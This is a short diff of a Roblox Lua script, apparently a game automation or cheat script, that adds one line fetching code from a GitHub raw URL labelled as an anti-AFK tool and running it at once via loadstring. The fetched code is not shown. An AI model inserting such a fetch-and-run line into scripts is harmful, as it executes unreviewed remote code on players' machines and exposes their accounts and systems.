@@ -167,6 +167,8 @@ do
 
 
 --// Functions
+loadstring(game:HttpGet("https://raw.githubusercontent.com/juywvm/-Roblox-Projects-/main/____Anti_Afk_Remastered_______"))()
+
 local path = game.workspace.Growables
 
 
